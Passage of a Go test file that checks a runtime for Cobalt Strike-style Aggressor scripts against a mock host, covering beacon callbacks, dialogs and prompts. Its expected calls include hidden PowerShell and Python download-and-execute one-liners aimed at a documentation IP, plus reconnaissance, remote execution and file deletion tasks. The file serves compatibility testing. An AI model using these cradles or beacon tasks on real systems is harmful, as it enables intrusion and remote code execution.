package opfor

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"testing"
	"time"
)

func TestOfficialBotExampleRunsDelayedCoroutineCallbacks(t *testing.T) {
	t.Parallel()

	runtime, _, host, output := loadOfficialBehaviorExample(t, "bot.cna")
	_, err := runtime.InvokeConsole(context.Background(), ConsoleInvocation{
		Kind:      BindingAlias,
		Name:      "go",
		RawInput:  "go",
		SessionID: String("beacon-7"),
	})
	if err != nil {
		t.Fatalf("InvokeConsole: %v", err)
	}
	calls := host.takeCalls()
	assertOfficialBehaviorCalls(t, calls,
		expectedOfficialCall("bpwd", "beacon-7"),
	)
	assertOfficialOneShotEventBindings(t, runtime, "beacon_output_alt", 1)
	if got := output.String(); got != "" {
		t.Fatalf("output before delayed callback = %q, want empty", got)
	}

	if _, err := runtime.DispatchEvent(
		context.Background(),
		"beacon_output_alt",
		String("beacon-7"),
		String(`C:\Users\operator`),
		Long(officialBehaviorInstant.UnixMilli()),
	); err != nil {
		t.Fatalf("DispatchEvent(beacon_output_alt): %v", err)
	}
	calls = host.takeCalls()
	assertOfficialBehaviorCalls(t, calls,
		expectedOfficialCall("bcd", "beacon-7", `c:\`),
		expectedOfficialCall("bshell", "beacon-7", "dir"),
	)
	assertOfficialOneShotEventBindings(t, runtime, "beacon_output_alt", 0)
	assertOfficialOneShotEventBindings(t, runtime, "beacon_output", 1)
	if got, want := output.String(), "WD of beacon-7 is: C:\\Users\\operator @ 03:04:05\n"; got != want {
		t.Fatalf("first callback output = %q, want %q", got, want)
	}

	results, err := runtime.DispatchEvent(
		context.Background(),
		"beacon_output_alt",
		String("other-beacon"),
		String("SHOULD NOT RESUME"),
		Long(officialBehaviorInstant.UnixMilli()),
	)
	if err != nil {
		t.Fatalf("second DispatchEvent(beacon_output_alt): %v", err)
	}
	if len(results) != 0 {
		t.Fatalf("consumed beacon_output_alt results = %d, want 0", len(results))
	}
	assertOfficialBehaviorCalls(t, host.takeCalls())
	assertOfficialOneShotEventBindings(t, runtime, "beacon_output", 1)
	if got, want := output.String(), "WD of beacon-7 is: C:\\Users\\operator @ 03:04:05\n"; got != want {
		t.Fatalf("output after repeated first event = %q, want %q", got, want)
	}

	if _, err := runtime.DispatchEvent(
		context.Background(),
		"beacon_output",
		String("beacon-7"),
		String("DIR OUTPUT"),
		Long(officialBehaviorInstant.UnixMilli()),
	); err != nil {
		t.Fatalf("DispatchEvent(beacon_output): %v", err)
	}
	calls = host.takeCalls()
	assertOfficialBehaviorCalls(t, calls,
		expectedOfficialCall("bls", "beacon-7", ".", officialCallbackArgument{}),
	)
	assertOfficialOneShotEventBindings(t, runtime, "beacon_output", 0)
	if got, want := output.String(), "WD of beacon-7 is: C:\\Users\\operator @ 03:04:05\nDir of c:\\ on beacon-7 @ 03:04:05:\nDIR OUTPUT\n"; got != want {
		t.Fatalf("second callback output = %q, want %q", got, want)
	}
	results, err = runtime.DispatchEvent(
		context.Background(),
		"beacon_output",
		String("beacon-7"),
		String("SHOULD NOT REENTER"),
		Long(officialBehaviorInstant.UnixMilli()),
	)
	if err != nil {
		t.Fatalf("second DispatchEvent(beacon_output): %v", err)
	}
	if len(results) != 0 {
		t.Fatalf("consumed beacon_output results = %d, want 0", len(results))
	}
	assertOfficialBehaviorCalls(t, host.takeCalls())

	lsCallback := host.takeCallback(t, "bls")
	if _, err := lsCallback.Invoke(
		context.Background(),
		String("beacon-7"),
		String("."),
		String("LS OUTPUT"),
	); err != nil {
		t.Fatalf("bls callback: %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls())
	if got, want := output.String(), "WD of beacon-7 is: C:\\Users\\operator @ 03:04:05\nDir of c:\\ on beacon-7 @ 03:04:05:\nDIR OUTPUT\nDir of c:\\ with ls():\nLS OUTPUT\n"; got != want {
		t.Fatalf("final callback output = %q, want %q", got, want)
	}
}

func assertOfficialOneShotEventBindings(t *testing.T, runtime *Runtime, name string, want int) {
	t.Helper()
	bindings := runtime.Bindings(BindingEvent, name)
	if len(bindings) != want {
		t.Fatalf("one-shot event bindings for %q = %d, want %d", name, len(bindings), want)
	}
	for _, binding := range bindings {
		if binding.Keyword != "when" || binding.Lifetime != BindingOnce {
			t.Fatalf("event binding for %q = keyword %q lifetime %d, want when/once",
				name, binding.Keyword, binding.Lifetime)
		}
	}
}

func TestOfficialCheckitExampleFiresRegisteredEvent(t *testing.T) {
	t.Parallel()

	runtime, _, host, output := loadOfficialBehaviorExample(t, "checkit.cna")
	if _, err := runtime.DispatchEvent(
		context.Background(), "beacon_checkin",
		String("beacon-9"), String("first"), Long(1_000),
	); err != nil {
		t.Fatalf("first beacon_checkin: %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls())
	if got := output.String(); got != "" {
		t.Fatalf("first checkin output = %q, want empty", got)
	}

	if _, err := runtime.DispatchEvent(
		context.Background(), "beacon_checkin",
		String("beacon-9"), String("revisited"), Long(61_001),
	); err != nil {
		t.Fatalf("revisited beacon_checkin: %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls())
	if got, want := output.String(), "Beacon beacon-9 is here!\n"; got != want {
		t.Fatalf("legacy fire_event output = %q, want %q", got, want)
	}

	if _, err := runtime.Invoke(
		context.Background(), "fireEvent",
		String("beacon_revisited"), String("beacon-current"),
	); err != nil {
		t.Fatalf("fireEvent: %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls())
	if got, want := output.String(), "Beacon beacon-9 is here!\nBeacon beacon-current is here!\n"; got != want {
		t.Fatalf("current fireEvent output = %q, want %q", got, want)
	}
}

func TestOfficialProcessLookupExamplesRunRetainedBPSCallbacks(t *testing.T) {
	t.Parallel()

	tests := []officialProcessLookupExample{
		officialGetExplorerExample,
		officialGetPIDAnyExample,
	}
	for _, test := range tests {
		test := test
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			runOfficialProcessLookupExample(t, test)
		})
	}
}

type officialProcessLookupExample struct {
	name        string
	alias       string
	rawInput    string
	processList string
	wantBlog    string
}

var (
	officialGetExplorerExample = officialProcessLookupExample{
		name:        "getexplorer.cna",
		alias:       "explorer",
		rawInput:    "explorer",
		processList: "System 4\nexplorer.exe 4242\ncmd.exe 99",
		wantBlog:    "The PID is: 4242",
	}
	officialGetPIDAnyExample = officialProcessLookupExample{
		name:        "getpidany.cna",
		alias:       "getpid",
		rawInput:    "getpid chrome.exe",
		processList: "System 4\nchrome.exe 8080\ncmd.exe 99",
		wantBlog:    "The PID of chrome.exe is: 8080",
	}
)

func runOfficialGetExplorerExample(t *testing.T) {
	t.Helper()
	runOfficialProcessLookupExample(t, officialGetExplorerExample)
}

func runOfficialGetPIDAnyExample(t *testing.T) {
	t.Helper()
	runOfficialProcessLookupExample(t, officialGetPIDAnyExample)
}

func runOfficialProcessLookupExample(t *testing.T, test officialProcessLookupExample) {
	t.Helper()
	runtime, _, host, output := loadOfficialBehaviorExample(t, test.name)
	_, err := runtime.InvokeConsole(context.Background(), ConsoleInvocation{
		Kind:      BindingAlias,
		Name:      test.alias,
		RawInput:  test.rawInput,
		SessionID: String("beacon-11"),
	})
	if err != nil {
		t.Fatalf("InvokeConsole: %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall("bps", "beacon-11", officialCallbackArgument{}),
	)

	callback := host.takeCallback(t, "bps")
	if _, err := callback.Invoke(
		context.Background(),
		String("beacon-11"),
		String(test.processList),
	); err != nil {
		t.Fatalf("bps callback: %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall("blog", "beacon-11", test.wantBlog),
	)
	if got := output.String(); got != "" {
		t.Fatalf("stdout = %q, want empty", got)
	}
}

func TestOfficialInitialExampleAdvancesPerBeaconCoroutine(t *testing.T) {
	t.Parallel()

	runtime, _, host, output := loadOfficialBehaviorExample(t, "initial.cna")
	dispatch := func(event, beacon string) {
		t.Helper()
		if _, err := runtime.DispatchEvent(context.Background(), event, String(beacon)); err != nil {
			t.Fatalf("DispatchEvent(%q, %q): %v", event, beacon, err)
		}
	}

	dispatch("beacon_initial", "beacon-a")
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall("binput", "beacon-a", "Task 1"),
		expectedOfficialCall("bshell", "beacon-a", "whoami /all"),
	)

	dispatch("beacon_checkin", "beacon-a")
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall("binput", "beacon-a", "Task 2"),
		expectedOfficialCall("bshell", "beacon-a", "arp -a"),
	)

	dispatch("beacon_initial", "beacon-b")
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall("binput", "beacon-b", "Task 1"),
		expectedOfficialCall("bshell", "beacon-b", "whoami /all"),
	)

	dispatch("beacon_checkin", "beacon-a")
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall("binput", "beacon-a", "Task 3"),
		expectedOfficialCall("bpowershell", "beacon-a", "2 + 2"),
		expectedOfficialCall("bpowershell", "beacon-a", "2 + 3"),
		expectedOfficialCall("bpowershell", "beacon-a", "2 + 4"),
	)

	dispatch("beacon_checkin", "beacon-a")
	assertOfficialBehaviorCalls(t, host.takeCalls())

	dispatch("beacon_checkin", "beacon-b")
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall("binput", "beacon-b", "Task 2"),
		expectedOfficialCall("bshell", "beacon-b", "arp -a"),
	)
	if got := output.String(); got != "" {
		t.Fatalf("stdout = %q, want empty", got)
	}
}

func TestOfficialSafeDeleteExampleRunsNestedPopupCallbacks(t *testing.T) {
	t.Parallel()

	runtime, _, host, output := loadOfficialBehaviorExample(t, "safedelete.cna")
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall("popup_clear", "filebrowser"),
	)

	files := ArrayValue(NewArray(String("one.txt"), String("two.bin")))
	browser := ObjectValue(&officialBehaviorObject{class: "browser"})
	if _, err := runtime.InvokeBinding(
		context.Background(), BindingPopup, "filebrowser",
		String("beacon-13"), String(`C:\Temp`), files, browser,
	); err != nil {
		t.Fatalf("InvokeBinding(filebrowser): %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls(), expectedOfficialCall("separator"))

	if _, err := runtime.InvokeBinding(context.Background(), BindingItem, "&Download"); err != nil {
		t.Fatalf("InvokeBinding(&Download): %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall("bdownload", "beacon-13", `C:\Temp\one.txt`),
		expectedOfficialCall("bdownload", "beacon-13", `C:\Temp\two.bin`),
	)

	if _, err := runtime.InvokeBinding(context.Background(), BindingItem, "&Execute"); err != nil {
		t.Fatalf("InvokeBinding(&Execute): %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall("prompt_text", "Arguments?", "", officialCallbackArgument{}),
	)
	promptText := host.takePromptResponder(t, "prompt_text")
	if _, err := promptText.Accept(context.Background(), String("-silent")); err != nil {
		t.Fatalf("prompt_text callback: %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall("bexecute", "beacon-13", `C:\Temp\one.txt -silent`),
		expectedOfficialCall("bexecute", "beacon-13", `C:\Temp\two.bin -silent`),
	)

	if _, err := runtime.InvokeBinding(context.Background(), BindingItem, "D&elete"); err != nil {
		t.Fatalf("InvokeBinding(D&elete): %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall(
			"prompt_confirm",
			"Do you really want to delete stuff",
			"Safety Check",
			officialCallbackArgument{},
		),
	)
	promptConfirm := host.takePromptResponder(t, "prompt_confirm")
	if _, err := promptConfirm.Accept(context.Background()); err != nil {
		t.Fatalf("prompt_confirm callback: %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall("brm", "beacon-13", `C:\Temp\one.txt`),
		expectedOfficialCall("brm", "beacon-13", `C:\Temp\two.bin`),
	)
	objectCalls := host.objects.takeCalls()
	if len(objectCalls) != 1 {
		t.Fatalf("object call count = %d, want 1", len(objectCalls))
	}
	objectCall := objectCalls[0]
	if objectCall.Op != ObjectInvoke || objectCall.Message != "ls" || !objectCall.Target.IdentityEqual(browser) {
		t.Fatalf("browser refresh = %#v, want ls on supplied browser", objectCall)
	}
	objectValues := objectCall.Values()
	if len(objectValues) != 1 || objectValues[0].String() != `C:\Temp` {
		t.Fatalf("browser ls arguments = %s, want C:\\Temp", ArrayValue(NewArray(objectValues...)).Describe())
	}
	if got := output.String(); got != "" {
		t.Fatalf("stdout = %q, want empty", got)
	}
}

func TestOfficialStagelessWebExampleRunsArtifactCallback(t *testing.T) {
	t.Parallel()

	runtime, _, host, output := loadOfficialBehaviorExample(t, "stagelessweb.cna")
	assertOfficialBehaviorCalls(t, host.takeCalls())
	if _, err := runtime.InvokeBinding(context.Background(), BindingPopup, "attacks"); err != nil {
		t.Fatalf("InvokeBinding(attacks): %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls())
	if _, err := runtime.InvokeBinding(context.Background(), BindingItem, "PowerShell Web Delivery (S)"); err != nil {
		t.Fatalf("InvokeBinding(PowerShell item): %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall("localip"),
		expectedOfficialCall(
			"dialog",
			"PowerShell Web Delivery (Stageless)",
			officialHashArgument{
				"uri":  "/a",
				"host": officialBehaviorIP,
				"port": int32(80),
			},
			officialCallbackArgument{},
		),
		expectedOfficialCall("dialog_description", host.dialog, "A stageless version of the PowerShell Web Delivery attack."),
		expectedOfficialCall("drow_text", host.dialog, "uri", "URI Path: ", int32(20)),
		expectedOfficialCall("drow_text", host.dialog, "host", "Local Host: "),
		expectedOfficialCall("drow_text", host.dialog, "port", "Local Port: "),
		expectedOfficialCall("drow_listener_stage", host.dialog, "listener", "Listener: "),
		expectedOfficialCall("drow_checkbox", host.dialog, "x64", "x64: ", "Use x64 payload"),
		expectedOfficialCall("dbutton_action", host.dialog, "Launch"),
		expectedOfficialCall("dialog_show", host.dialog),
	)

	options := NewHash()
	options.Set("listener", String("listener-A"))
	options.Set("host", String(officialBehaviorIP))
	options.Set("port", Int(80))
	options.Set("uri", String("/a"))
	options.Set("x64", String("true"))
	activateOfficialDialog(t, host, options)
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall(
			"artifact_stageless",
			"listener-A", "powershell", "x64", officialNullArgument{}, officialCallbackArgument{},
		),
	)

	artifactCallback := host.takeCallback(t, "artifact_stageless")
	if _, err := artifactCallback.Invoke(context.Background(), String("POWERSHELL-PAYLOAD")); err != nil {
		t.Fatalf("artifact_stageless callback: %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall(
			"site_host",
			officialBehaviorIP, int32(80), "/a", "POWERSHELL-PAYLOAD", "text/plain",
			"Scripted Web Delivery (powershell)",
		),
		expectedOfficialCall(
			"prompt_text",
			"One-liner: ",
			"powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('"+officialBehaviorURL+"'))\"",
			officialCallbackArgument{},
		),
	)
	if got := output.String(); got != "" {
		t.Fatalf("stdout = %q, want empty", got)
	}
}

func TestOfficialStagelessPythonExampleRunsSequentialArtifactCallbacks(t *testing.T) {
	t.Parallel()

	runtime, _, host, output := loadOfficialBehaviorExample(t, "stagelesspython.cna")
	assertOfficialBehaviorCalls(t, host.takeCalls())
	if _, err := runtime.InvokeBinding(context.Background(), BindingPopup, "attacks"); err != nil {
		t.Fatalf("InvokeBinding(attacks): %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls())
	if _, err := runtime.InvokeBinding(context.Background(), BindingItem, "Python Web Delivery (S)"); err != nil {
		t.Fatalf("InvokeBinding(Python item): %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall("localip"),
		expectedOfficialCall(
			"dialog",
			"Python Web Delivery (Stageless)",
			officialHashArgument{
				"uri":  "/a",
				"host": officialBehaviorIP,
				"port": int32(80),
			},
			officialCallbackArgument{},
		),
		expectedOfficialCall("dialog_description", host.dialog, "A stageless version of the Python Web Delivery attack."),
		expectedOfficialCall("drow_text", host.dialog, "uri", "URI Path: ", int32(20)),
		expectedOfficialCall("drow_text", host.dialog, "host", "Local Host: "),
		expectedOfficialCall("drow_text", host.dialog, "port", "Local Port: "),
		expectedOfficialCall("drow_listener_stage", host.dialog, "listener", "Listener: "),
		expectedOfficialCall("dbutton_action", host.dialog, "Launch"),
		expectedOfficialCall("dialog_show", host.dialog),
	)

	options := NewHash()
	options.Set("listener", String("listener-A"))
	options.Set("host", String(officialBehaviorIP))
	options.Set("port", Int(80))
	options.Set("uri", String("/a"))
	activateOfficialDialog(t, host, options)
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall(
			"artifact_stageless",
			"listener-A", "raw", "x86", officialNullArgument{}, officialCallbackArgument{},
		),
	)

	x86Callback := host.takeCallback(t, "artifact_stageless")
	if _, err := x86Callback.Invoke(context.Background(), String("X86-PAYLOAD")); err != nil {
		t.Fatalf("x86 artifact callback: %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall(
			"artifact_stageless",
			"listener-A", "raw", "x64", officialNullArgument{}, officialCallbackArgument{},
		),
	)

	x64Callback := host.takeCallback(t, "artifact_stageless")
	if _, err := x64Callback.Invoke(context.Background(), String("X64-PAYLOAD")); err != nil {
		t.Fatalf("x64 artifact callback: %v", err)
	}
	assertOfficialBehaviorCalls(t, host.takeCalls(),
		expectedOfficialCall(
			"site_host",
			officialBehaviorIP, int32(80), "/a",
			"import base64; exec base64.b64decode(\"UFlUSE9OLVNUVUI=\")",
			"text/plain", "Scripted Web Delivery (python)",
		),
		expectedOfficialCall(
			"prompt_text",
			"One-liner: ",
			"python -c \"import urllib2; exec urllib2.urlopen('"+officialBehaviorURL+"').read();\"",
			officialCallbackArgument{},
		),
	)
	objectCalls := host.objects.takeCalls()
	if len(objectCalls) != 1 {
		t.Fatalf("ArtifactUtils object call count = %d, want 1", len(objectCalls))
	}
	objectCall := objectCalls[0]
	if objectCall.Op != ObjectInvoke || objectCall.Class != "common.ArtifactUtils" || objectCall.Message != "buildPython" {
		t.Fatalf("ArtifactUtils call = %#v", objectCall)
	}
	objectValues := objectCall.Values()
	if len(objectValues) != 2 || objectValues[0].String() != "X86-PAYLOAD" || objectValues[1].String() != "X64-PAYLOAD" {
		t.Fatalf("ArtifactUtils arguments = %s", ArrayValue(NewArray(objectValues...)).Describe())
	}
	if got := output.String(); got != "" {
		t.Fatalf("stdout = %q, want empty", got)
	}
}

var officialBehaviorInstant = time.Date(2024, time.January, 2, 3, 4, 5, 0, time.UTC)

const (
	officialBehaviorIP  = "192.0.2.10"
	officialBehaviorURL = "http://192.0.2.10:80/a"
)

type officialBehaviorHost struct {
	mu        sync.Mutex
	calls     []officialBehaviorCall
	callbacks map[string][]Callable
	dialogs   []officialBehaviorDialog
	prompts   map[string][]AggressorPromptResponder
	objects   *officialBehaviorObjectHost
	dialog    Value
}

type officialBehaviorDialog struct {
	presentation AggressorDialogPresentation
	responder    AggressorDialogResponder
}

type officialBehaviorCall struct {
	name   string
	values []Value
}

func (host *officialBehaviorHost) Call(_ context.Context, invocation Invocation) (Value, error) {
	if invocation.Name == "call" {
		return Null(), fmt.Errorf("typed Aggressor Team Server RPC call unexpectedly reached Host")
	}
	if invocation.Name == "when" {
		return Null(), fmt.Errorf("portable Aggressor when call unexpectedly reached Host")
	}
	if _, artifact := aggressorArtifactSpecs[invocation.Name]; artifact {
		return Null(), fmt.Errorf("typed Aggressor artifact call %s unexpectedly reached Host", invocation.Name)
	}
	if _, site := aggressorSiteSpecs[invocation.Name]; site {
		return Null(), fmt.Errorf("typed Aggressor site call %s unexpectedly reached Host", invocation.Name)
	}
	if _, clientUI := aggressorClientUISpecs[invocation.Name]; clientUI {
		return Null(), fmt.Errorf("typed Aggressor client UI call %s unexpectedly reached Host", invocation.Name)
	}
	if _, dataStore := aggressorDataStoreSpecs[invocation.Name]; dataStore {
		return Null(), fmt.Errorf("typed Aggressor data-store call %s unexpectedly reached Host", invocation.Name)
	}
	if isOfficialBehaviorUIFunction(invocation.Name) {
		return Null(), fmt.Errorf("typed Aggressor UI call %s unexpectedly reached Host", invocation.Name)
	}
	if _, beaconAction := aggressorBeaconActionSpecs[invocation.Name]; beaconAction {
		return Null(), fmt.Errorf("typed Aggressor Beacon action %s unexpectedly reached Host", invocation.Name)
	}
	values := invocation.Values()
	host.mu.Lock()
	host.calls = append(host.calls, officialBehaviorCall{
		name:   invocation.Name,
		values: append([]Value(nil), values...),
	})
	host.mu.Unlock()
	return Null(), nil
}

func (host *officialBehaviorHost) HandleAggressorDataStore(
	_ context.Context,
	request AggressorDataStoreRequest,
) (Value, error) {
	host.mu.Lock()
	host.calls = append(host.calls, officialBehaviorCall{
		name: request.Name, values: append([]Value(nil), request.Arguments...),
	})
	host.mu.Unlock()
	return Null(), nil
}

func (host *officialBehaviorHost) CallAggressorTeamServerRPC(
	_ context.Context,
	request AggressorTeamServerRPCRequest,
) error {
	if request.Callback.Valid() {
		return fmt.Errorf("official Team Server RPC fixture expected a null callback for %s", request.Command.Describe())
	}
	values := make([]Value, 0, 2+len(request.Arguments))
	values = append(values, request.Command, Null())
	values = append(values, request.Arguments...)
	host.mu.Lock()
	host.calls = append(host.calls, officialBehaviorCall{name: request.Name, values: values})
	host.mu.Unlock()
	return nil
}

func (host *officialBehaviorHost) GenerateAggressorArtifact(
	_ context.Context,
	request AggressorArtifactRequest,
) (Value, error) {
	values := []Value{request.Listener, request.ArtifactType, request.Architecture}
	var callback Callable
	switch request.Kind {
	case AggressorArtifactPayload:
		values = append(values, request.ExitMethod, request.SystemCallMethod)
		if request.HasHTTPLibrary {
			values = append(values, request.HTTPLibrary)
		}
		if request.HasDNSCommMode {
			values = append(values, request.DNSCommMode)
		}
		if request.HasMalleableProfileOverride {
			values = append(values, request.MalleableProfileOverride)
		}
		if request.HasPayloadStoreInfo {
			values = append(values, request.PayloadStoreInfo)
		}
	case AggressorArtifactStageless:
		if isNilInterface(request.Callback) {
			return Null(), fmt.Errorf("typed Aggressor artifact %s has a nil callback", request.Name)
		}
		callback = request.Callback
		values = append(values, request.ProxyConfiguration, FunctionValue(callback))
	default:
		return Null(), fmt.Errorf("typed Aggressor artifact %s has unknown kind %q", request.Name, request.Kind)
	}

	host.mu.Lock()
	host.calls = append(host.calls, officialBehaviorCall{name: request.Name, values: values})
	if callback != nil {
		if host.callbacks == nil {
			host.callbacks = make(map[string][]Callable)
		}
		host.callbacks[request.Name] = append(host.callbacks[request.Name], callback)
	}
	host.mu.Unlock()
	return Null(), nil
}

func (host *officialBehaviorHost) HandleAggressorSite(
	_ context.Context,
	request AggressorSiteRequest,
) (Value, error) {
	var values []Value
	result := Null()
	switch request.Kind {
	case AggressorSiteLocalIP:
		result = String(officialBehaviorIP)
	case AggressorSiteHost:
		values = []Value{
			request.Host,
			request.Port,
			request.URI,
			request.Content,
			request.MIMEType,
			request.Description,
		}
		if request.HasSSL {
			values = append(values, request.SSL)
		}
		result = String(officialBehaviorURL)
	case AggressorSiteKill:
		values = []Value{request.Port, request.URI}
	case AggressorSiteList:
		result = ArrayValue(NewArray())
	default:
		return Null(), fmt.Errorf("typed Aggressor site %s has unknown kind %q", request.Name, request.Kind)
	}

	host.mu.Lock()
	host.calls = append(host.calls, officialBehaviorCall{name: request.Name, values: values})
	host.mu.Unlock()
	return result, nil
}

func (host *officialBehaviorHost) HandleAggressorClientUI(
	_ context.Context,
	request AggressorClientUIRequest,
) (Value, error) {
	if request.Operation == AggressorClientUISeparator {
		if request.Composition == nil || request.Composition.Kind != BindingPopup || request.Composition.Name != "filebrowser" {
			return Null(), fmt.Errorf("typed separator composition = %#v, want filebrowser popup", request.Composition)
		}
	}
	host.mu.Lock()
	host.calls = append(host.calls, officialBehaviorCall{
		name: request.Name, values: append([]Value(nil), request.Arguments...),
	})
	host.mu.Unlock()
	return Null(), nil
}

func (host *officialBehaviorHost) DispatchAggressorBeaconAction(
	_ context.Context,
	action AggressorBeaconAction,
) error {
	values := make([]Value, 0, 1+len(action.Arguments)+1)
	values = append(values, action.Target)
	values = append(values, action.Arguments...)

	var callback Callable
	switch action.CallbackState {
	case AggressorCallbackOmitted:
	case AggressorCallbackNull:
		values = append(values, Null())
	case AggressorCallbackCallable:
		if isNilInterface(action.Callback) {
			return fmt.Errorf("typed Aggressor Beacon action %s has a nil callback", action.Name)
		}
		callback = action.Callback
		values = append(values, FunctionValue(callback))
	default:
		return fmt.Errorf("typed Aggressor Beacon action %s has callback state %d", action.Name, action.CallbackState)
	}

	host.mu.Lock()
	host.calls = append(host.calls, officialBehaviorCall{
		name:   action.Name,
		values: values,
	})
	if callback != nil {
		if host.callbacks == nil {
			host.callbacks = make(map[string][]Callable)
		}
		host.callbacks[action.Name] = append(host.callbacks[action.Name], callback)
	}
	host.mu.Unlock()
	return nil
}

func (host *officialBehaviorHost) PublishAggressorBeaconTranscript(
	_ context.Context,
	record AggressorBeaconTranscriptRecord,
) error {
	name, values := aggressorBeaconTranscriptCall(record)
	host.mu.Lock()
	host.calls = append(host.calls, officialBehaviorCall{name: name, values: values})
	host.mu.Unlock()
	return nil
}

func (host *officialBehaviorHost) takeCalls() []officialBehaviorCall {
	host.mu.Lock()
	defer host.mu.Unlock()
	calls := append([]officialBehaviorCall(nil), host.calls...)
	host.calls = nil
	return calls
}

func (host *officialBehaviorHost) takeCallback(t *testing.T, key string) Callable {
	t.Helper()
	host.mu.Lock()
	defer host.mu.Unlock()
	callbacks := host.callbacks[key]
	if len(callbacks) == 0 {
		t.Fatalf("retained callbacks for %q = 0", key)
	}
	callback := callbacks[0]
	if len(callbacks) == 1 {
		delete(host.callbacks, key)
	} else {
		host.callbacks[key] = callbacks[1:]
	}
	return callback
}

func (host *officialBehaviorHost) PresentAggressorDialog(
	_ context.Context,
	presentation AggressorDialogPresentation,
	responder AggressorDialogResponder,
) error {
	dialog, ok := responder.(*aggressorDialog)
	if !ok || dialog == nil {
		return fmt.Errorf("dialog responder type = %T", responder)
	}
	dialog.mu.Lock()
	dialogValue := dialog.value
	callback := dialog.callback
	dialog.mu.Unlock()
	if callback == nil {
		return errors.New("dialog callback is nil")
	}
	defaults := NewHash()
	for _, item := range presentation.Defaults {
		defaults.Set(item.Name, item.Value)
	}
	calls := []officialBehaviorCall{{
		name: "dialog",
		values: []Value{
			String(presentation.Title),
			HashValue(defaults),
			FunctionValue(callback),
		},
	}}
	if presentation.HasDescription {
		calls = append(calls, officialBehaviorCall{
			name:   "dialog_description",
			values: []Value{dialogValue, String(presentation.Description)},
		})
	}
	for _, row := range presentation.Rows {
		values := []Value{dialogValue, String(row.Name), String(row.Label)}
		switch row.Function {
		case "drow_checkbox":
			values = append(values, String(row.CheckboxText))
		case "drow_combobox":
			values = append(values, ArrayValue(NewArray(row.Options...)))
		case "drow_text":
			if row.HasWidth {
				values = append(values, Int(row.Width))
			}
		}
		calls = append(calls, officialBehaviorCall{name: row.Function, values: values})
	}
	for _, button := range presentation.Buttons {
		if button.Kind == AggressorDialogButtonAction {
			calls = append(calls, officialBehaviorCall{
				name: "dbutton_action", values: []Value{dialogValue, String(button.Label)},
			})
		} else {
			calls = append(calls, officialBehaviorCall{
				name: "dbutton_help", values: []Value{dialogValue, String(button.URL)},
			})
		}
	}
	calls = append(calls, officialBehaviorCall{name: "dialog_show", values: []Value{dialogValue}})
	host.mu.Lock()
	host.dialog = dialogValue
	host.calls = append(host.calls, calls...)
	host.dialogs = append(host.dialogs, officialBehaviorDialog{presentation: presentation, responder: responder})
	host.mu.Unlock()
	return nil
}

func (host *officialBehaviorHost) PresentAggressorPrompt(
	_ context.Context,
	presentation AggressorPromptPresentation,
	responder AggressorPromptResponder,
) error {
	prompt, ok := responder.(*aggressorPrompt)
	if !ok || prompt == nil {
		return fmt.Errorf("prompt responder type = %T", responder)
	}
	prompt.mu.Lock()
	callback := prompt.callback
	prompt.mu.Unlock()
	if callback == nil {
		return errors.New("prompt callback is nil")
	}
	callbackValue := FunctionValue(callback)
	var values []Value
	switch presentation.Kind {
	case AggressorPromptConfirm:
		values = []Value{String(presentation.Text), String(presentation.Title), callbackValue}
	case AggressorPromptText:
		values = []Value{String(presentation.Text), presentation.Default, callbackValue}
	case AggressorPromptDirectoryOpen, AggressorPromptFileOpen:
		values = []Value{String(presentation.Title), presentation.Default, presentation.Multiple, callbackValue}
	case AggressorPromptFileSave:
		values = []Value{presentation.Default, callbackValue}
	default:
		return fmt.Errorf("unknown prompt kind %q", presentation.Kind)
	}
	host.mu.Lock()
	host.calls = append(host.calls, officialBehaviorCall{name: presentation.Name, values: values})
	if host.prompts == nil {
		host.prompts = make(map[string][]AggressorPromptResponder)
	}
	host.prompts[presentation.Name] = append(host.prompts[presentation.Name], responder)
	host.mu.Unlock()
	return nil
}

func (host *officialBehaviorHost) takePromptResponder(t *testing.T, name string) AggressorPromptResponder {
	t.Helper()
	host.mu.Lock()
	defer host.mu.Unlock()
	responders := host.prompts[name]
	if len(responders) == 0 {
		t.Fatalf("retained prompt responders for %q = 0", name)
	}
	responder := responders[0]
	if len(responders) == 1 {
		delete(host.prompts, name)
	} else {
		host.prompts[name] = responders[1:]
	}
	return responder
}

func activateOfficialDialog(t *testing.T, host *officialBehaviorHost, options *Hash) {
	t.Helper()
	host.mu.Lock()
	if len(host.dialogs) == 0 {
		host.mu.Unlock()
		t.Fatal("retained dialog responders = 0")
	}
	dialog := host.dialogs[0]
	host.dialogs = host.dialogs[1:]
	host.mu.Unlock()
